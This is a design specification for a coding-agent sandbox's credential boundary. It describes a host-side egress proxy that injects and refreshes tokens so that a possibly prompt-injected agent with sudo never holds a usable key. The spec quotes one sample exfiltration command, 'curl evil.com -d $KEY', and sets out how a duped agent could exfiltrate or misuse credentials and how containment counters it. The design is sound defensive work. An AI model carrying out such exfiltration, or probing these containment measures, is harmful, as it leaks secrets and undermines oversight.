# Secure secrets — the credential boundary (DF38 design)

**Status:** Design 2026-06-25 (**D95**), not yet implemented. Resolves
[DF38](findings-unresolved.md) (secure credential delivery) and
[DF39](findings-unresolved.md) (the `$HOME` credential-file bleed). Backed by
[research/secure-credentials.md](research/secure-credentials.md). Converges with
**netpolicy** ([D90](netpolicy.md)) — it is the *credential half* of netpolicy's
already-reserved `egress-proxy` strategy — and extends the caller-credential
contract of **D63** and the envsetup secure-secrets seam of
[D91](envsetup.md) §5. This spec defines the target; the build is phased (§11).

## One-line definition

The durable credential boundary is a **host-side (out-of-agent-reach) egress
proxy** that holds the real credentials, injects them on allowlisted egress, and
**refreshes** short-lived tokens transparently — so the live credential **never
enters the sandbox** and the agent never holds a token it can exfiltrate.

## Threat and reframe (brief; full treatment in the research)

The realistic threat is a **duped agent** (confused deputy): a legitimate agent
prompt-injected into exfiltrating or abusing a credential through its normal
tools (the "lethal trifecta"). Concealing an in-use credential from the agent is
a **non-goal** (usable ⇒ reachable). The achievable goals are: **bound blast
radius**, **make exfiltration hard** (keep the live credential out of the box),
and **make it detectable**. Today's behavior — copying/staging a credential the
agent reads — is the weakest option (a leaked key is reusable indefinitely). The
research surveyed Vault, IMDSv2, GitHub OIDC, BuildKit, K8s, and the AI-agent
field and converges on one *novel* control (no shipping coding agent does it):
the broker/egress-proxy. yoloai is already ahead of the field (read-only mounts,
no implicit credential inheritance, an egress allowlist) and its copy/diff/apply
review gate already defends the irreducible in-session residual.

## The architecture: one boundary for credentials *and* network

netpolicy ([D90](netpolicy.md)) already establishes that enforcement is a
**pluggable strategy** whose point need not be in-sandbox, with `egress-proxy`
reserved as "an out-of-agent-control L7 proxy, domain-native, hostile-grade … the
strategy contract must allow an enforcement point **outside the sandbox** as
first-class." DF38 **adds credential injection + refresh onto that same proxy.**
The agent-proxy research ([research/agent-proxy-support.md](research/agent-proxy-support.md))
pins the load-bearing primitive: env-proxy is never a boundary, transparent
intercept alone is bypassable (the agent has `NET_ADMIN`/sudo), so the boundary
is **a default-deny egress firewall in the sandbox netns whose only outbound path
is forced to a filtering proxy on a *different principal/namespace* than the
agent.** That one proxy does three jobs:

1. **Network policy** — SNI/Host-based allowlist, kills DNS-exfil (netpolicy's
   `egress-proxy` strategy; a strictly-better interpretation of the same
   domain-centric allowlist, *no policy-model change*).
2. **Credential injection** — for allowlisted destinations, the proxy adds the
   real `Authorization` / `x-api-key` header. The credential is held by the proxy
   (a different principal), never in the sandbox.
3. **Refresh + audit** — the proxy re-mints/refreshes short-lived credentials
   (§6) and logs every egress attempt (the detection layer).

Credentials and network thus share **one** enforcement point — built once, not
bolted on twice. This is the architectural payoff of researching now.

```
 sandbox netns (agent, has sudo)          host / different principal
 ┌───────────────────────────┐            ┌───────────────────────────────┐
 │ agent → HTTPS(api.anthropic│  forced    │ egress proxy                  │
 │  .com) trusts yoloai CA    │──default── │  • SNI allowlist (netpolicy)  │
 │ default-deny egress;       │  deny +    │  • inject Authorization hdr   │
 │ only route = the proxy     │  only-path │  • hold + refresh sk-ant-oat  │──→ api.anthropic.com
 │ NO credential in this box  │            │  • log/canary                 │   (real cred upstream)
 └───────────────────────────┘            └───────────────────────────────┘
```

## The proxy: locality, lifecycle, unforgeable reach

- **Locality (hostile-containment primitive).** The proxy runs **out of the
  agent's reach** — a host-side process (container backends) or an isolated netns
  on a **different principal** than the agent (D62 principals exist for naming;
  this extends them to a network/trust boundary). The sandbox netns is
  default-deny egress with its *only* outbound route forced to the proxy; because
  the agent has sudo, the deny-and-force must be enforced from **outside** the
  agent's namespace, not by in-sandbox iptables it can rewrite.
- **Unforgeable reach (the IMDSv2 analogue).** Only the agent's own egress path
  reaches the proxy as a credential-injecting client; arbitrary destinations the
  agent dials are denied (not silently proxied). This mirrors IMDSv2's
  anti-SSRF/hop-limit posture: the deputy cannot redirect the injected credential
  to an attacker endpoint because non-allowlisted destinations never get the
  header *and* never get egress.
- **Lifecycle.** One proxy per sandbox (simplest, strongest isolation) or per
  principal (shared, scoped). It comes up with the substrate (before the agent
  Launch) and tears down with the sandbox. Its credential store is in-memory,
  host-side, never staged into the box.

## Credential injection for LLM API keys (TLS interception)

LLM endpoints (Anthropic, OpenAI) authenticate with a **static header**
(`x-api-key` / `Authorization: Bearer`). To inject it the proxy must terminate
TLS (MITM): see the plaintext request, add the header, re-encrypt to the upstream
with the real credential. Requirements and caveats:

- **A yoloai CA trusted in the sandbox.** The agent's HTTP client must trust the
  proxy's CA. This is per-agent (verified, agent-proxy research): Claude Code
  honors `NODE_EXTRA_CA_CERTS`; Codex `CODEX_CA_CERTIFICATE` / `SSL_CERT_FILE`;
  others vary; Aider needs `DISABLE_AIOHTTP_TRANSPORT`. The agent layer must
  declare its **CA-trust knob** (a new `EnvSpec`/agent-definition field) so
  envsetup can point each agent at the proxy CA. The CA private key is host-side.
- **TLS pinning is the hard limit.** A client that pins the upstream cert (rather
  than trusting the system/CA store) cannot be MITM'd. *Spike needed* per
  provider SDK: do the Anthropic/OpenAI clients used by each agent pin, or honor
  the CA store + proxy env? (Claude Code is reqwest/Node honoring `NODE_EXTRA_CA_CERTS`
  — promising; verify no pinning on the API path.)
- **Forced routing, not cooperative.** `HTTPS_PROXY` alone is bypassable; the
  default-deny-egress-netns forces *all* traffic through the proxy regardless, so
  even an agent that ignores the env var cannot reach the network except via the
  proxy. The env var is a hint; the netns is the boundary.
- **Result.** The agent makes credential-less requests; the proxy adds the
  credential only for allowlisted hosts; a duped `curl evil.com -d $KEY` has no
  key (the agent never had one) *and* is egress-denied.

## Token refresh for long sessions (load-bearing)

A sandbox session can run **hours or days**; a scoped short-lived token (Anthropic
WIF `sk-ant-oat01`, default 1h; GitHub App token 1h) **expires mid-session.**
This is decisive for the architecture:

- **Env/file delivery cannot refresh.** A token placed in the agent's process
  environment (today / E3) is fixed at launch — you cannot mutate a running
  process's env, so a 1h token simply breaks a 3h session, and there is no clean
  re-injection path. **Short-lived tokens are fundamentally incompatible with
  long sessions under env/file delivery.**
- **The proxy refreshes transparently.** Because the credential lives at the
  proxy and the agent never holds it, the proxy can re-mint/rotate the token
  underneath an ongoing session — the agent's requests keep succeeding across
  rotations, oblivious. **Refresh structurally *requires* that the credential
  boundary is the proxy, not the agent's env.** This is a third independent
  argument for the broker (alongside no-host-at-rest and exfil-resistance).
- **Where the fresh token comes from** is the embedder's, via the caller hook
  (§8): yoloai's proxy calls the embedder's credential provider as expiry nears
  and swaps in the new value. yoloai does not mint Anthropic/GitHub tokens; it
  *orchestrates the refresh* of caller-supplied ones.

## Git credentials: per-session repo-scoped token broker

Git is brokered the same way, not by copying a key in:

- A **host-side minter** (e.g. a GitHub App the embedder configures) issues a
  **1h, single-repo, least-permission** installation token; the App private key
  stays host-side.
- The token reaches git via a **credential helper** inside the sandbox (git asks
  per-operation and never persists it), or via the proxy on HTTPS git egress.
- Refresh uses the same provider hook (§8) — a new token before expiry, invisible
  to the running agent.
- **SSH** is supported as an alternative (agent forwarding: a signing socket, key
  never enters the box) but is **weaker** here — it forwards a full-reach key with
  no native repo-scoping; only defensible with a FIDO `sk-` per-signature-touch
  key. The per-session repo-scoped *token* broker dominates it and is the default
  recommendation.

## The caller hook: a refresh-capable credential source (extends D63)

D63 made the caller-supplied `Env` snapshot the single authorized source for both
`${VAR}` expansion and agent credentials (zero ambient reads), with
`SecretsStagingDir` letting the embedder choose the staging *where*. DF38 extends
the **what** from a static value to a **source**:

- Today: a credential is a static string in the `Env` snapshot (resolved by
  `envsetup.ResolveSecretEnv` into `EnvSpec` credential values).
- New: a credential may instead be a **`CredentialSource`** the embedder supplies
  — conceptually `Fetch(ctx) → (value, expiresAt)` — which yoloai's proxy calls
  to obtain the current token and **calls again before `expiresAt`** to refresh.
  A static key is the degenerate `CredentialSource` (never expires); a WIF/GH-App
  token is a live one. This keeps the "library never mints/reads ambient
  credentials" discipline (D63) — the embedder owns minting; yoloai owns
  *delivery, injection, and refresh-orchestration*.
- The agent layer declares, per agent, **which credentials are brokerable**
  (which header/destination they map to) and the **CA-trust knob** — compiled into
  the `EnvSpec` exactly as other agent declarations are (D89/D91), so envsetup/the
  proxy stay agent-agnostic.

## Baseline vs. opt-in: the simple default must not be the dangerous one

Not every use needs the proxy (a personal key on your own laptop, single-user,
trusted agent, ephemeral box, is low-risk — see the research threat-model: at-rest
is a non-issue single-user). The design offers a **trust posture**, and the
*safe* option must be the one that engages when the stakes are high:

- **Direct delivery** (today / E3: env on the launched process) — fine for the
  trusted/personal case; simplest; no proxy. The credential is in the agent's env.
- **Brokered** (the proxy holds + injects + refreshes; no credential in the box) —
  the posture for **untrusted agents, metered/JV keys, multi-principal embedders,
  and any short-lived-token + long-session combination** (which *requires* it).

The default is chosen so that the dangerous combination (real billable key +
untrusted agent) does **not** silently fall into direct delivery — an embedder
opting into the metered/untrusted posture gets brokering by construction, and the
CLI's single-user default stays simple. (Exact default policy is an open question,
§14 — but the rule is fixed: simple ≠ dangerous.)

## DF39: the `$HOME` credential mount becomes caller-controlled

DF39 (the agent's `~/.claude`-style host config bind-mounted into the sandbox) is
the last implicit ambient-credential bleed. Under DF38 it becomes **opt-in and
filtered**: the caller controls what credential material enters; the wholesale
`$HOME` mount is never implicit. Where an agent authenticates via a config file
(not a header), the brokered posture stages only a **filtered** seed (auth-only,
caller-approved) — or, preferably, the agent uses the proxy-injected path and no
host credential file enters at all. This is the envsetup seam (D91 §5: "the
host-config seed must be able to become opt-in / filtered").

## Ownership: yoloai vs. the embedder

- **yoloai owns:** the egress proxy (network + credential injection + refresh
  orchestration + logging), the default-deny-egress-netns forced-routing boundary,
  the yoloai CA + its injection into each agent's trust store, the
  `CredentialSource`/refresh caller-hook API, ephemeral file-not-env delivery for
  the non-brokered residue, and canary/egress-log support.
- **The embedder owns:** minting, scoping, and revoking the *actual* credentials
  (Anthropic WIF, GitHub App, Vault, cloud workload identity) and supplying them
  as a `CredentialSource`. yoloai cannot mint or revoke a provider's token; it
  *prefers, documents, and orchestrates the refresh of* short-lived ones.

## Phasing (what to reserve now vs. build later)

The user's load-bearing concern is that the delivery **contract** not calcify
around "key-into-sandbox." So the contract work comes first; the proxy build
follows.

- **Reserve now (the seam — small, do during/after envsetup):**
  1. The `EnvSpec`/agent-definition gains a **credential-shape that names the
     destination + header + CA-trust knob** per brokerable credential (not just
     "an env var name"), so the agent layer's declarations don't presuppose
     env delivery.
  2. The caller contract gains the **`CredentialSource`** abstraction (static
     value *or* refreshable provider) alongside the D63 `Env` snapshot — so
     embedders can pass refreshable creds before the proxy exists.
  3. netpolicy's `egress-proxy` strategy contract is confirmed to carry the
     credential-injection responsibility (already reserved as "enforcement
     outside the sandbox"; this just records that creds ride it).
  These are behavior-preserving contract additions; nothing routes through a
  proxy yet, but no future proxy requires a breaking change.
- **Build later (the proxy — a dedicated effort):** the L7 proxy, TLS-MITM + CA
  injection, the forced-routing default-deny-egress netns on a different
  principal, per-provider pinning spikes, refresh loop, egress logging/canaries.
  This is the netpolicy `egress-proxy` strategy implementation; DF38 + D90 build
  it together.

## Honest residuals (what the proxy does not solve)

Brokering converts "agent steals a *reusable* credential" into "agent misuses a
*scoped* capability while the session is live." It does **not** stop a duped agent
from: making allowlisted requests it shouldn't, pushing malicious commits to the
in-scope repo during the session, or exfiltrating through an over-broad
allowlisted endpoint (open redirector, user-content host, DNS-subdomain). Those
are defended **orthogonally** and must compose with credential delivery:

- the **copy/diff/apply review gate** (yoloai's core differentiator — a human
  reviews the diff before it lands; the strongest defense against in-session repo
  abuse);
- a **narrow** SNI allowlist (a broad `github.com` allow is itself an exfil path);
- **detection** — per-sandbox egress logging + new-destination flags, and
  **canary tokens** planted in the workdir (a near-zero-cost tripwire that
  confirms exfil reached an attacker — directly serving "noticing the attempt is
  part of the defense").

## Open questions / spikes

1. **TLS pinning per provider/agent.** Do the Anthropic/OpenAI SDKs each agent
   uses honor the system/CA store (MITM-able) or pin? Spike Claude Code, Codex,
   Gemini, OpenCode, Aider against a local MITM proxy + the agent CA env knob.
2. **Default policy** for the trust posture — when does brokering engage by
   default (an explicit `--untrusted`/metered flag? auto when a `CredentialSource`
   is refreshable? always for non-CLI embedders?). Rule fixed (simple ≠
   dangerous); knob TBD.
3. **`CredentialSource` API ergonomics** — interface shape, in-process callback
   vs. a broker endpoint, how it threads through the public client + EnvSpec, and
   the refresh cadence/leeway.
4. **Proxy locality across backends** — host process (Docker/containerd) vs.
   in-VM/guest (Tart/Seatbelt, where "host-side" differs); the different-principal
   netns mechanics; how the sandbox is forced through it on each backend.
5. **Convergence mechanics with netpolicy** — the single proxy deployment that
   serves both the `egress-proxy` network strategy and credential injection, so
   the two layers share one implementation.

## Cross-references

- **Decisions:** [D90](netpolicy.md) (netpolicy reserves the `egress-proxy`
  strategy this rides), [D91](envsetup.md) §5 (the envsetup secure-secrets seam),
  D63 (caller-`Env` credential contract this extends), D89 (agent declares its
  credential shape + CA-trust knob); this design's own entry **D95**.
- **Findings resolved by this design:** [DF38](findings-unresolved.md) (secure
  credential delivery), [DF39](findings-unresolved.md) (`$HOME` credential bleed →
  caller-controlled). [DF43](findings-unresolved.md) at-rest hygiene is subsumed
  (brokering keeps creds out of the box entirely).
- **Research:** [research/secure-credentials.md](research/secure-credentials.md)
  (the verified survey + recommendation), [research/agent-proxy-support.md](research/agent-proxy-support.md)
  (the proxy-boundary primitive + per-agent CA/proxy support),
  [research/security.md](research/security.md) (the Docker-Sandboxes credential-proxy
  prior art).
- **Consumer/driver:** control-eval — the metered-JV-key + adversarial-agent case
  is the concrete driver for building the proxy.
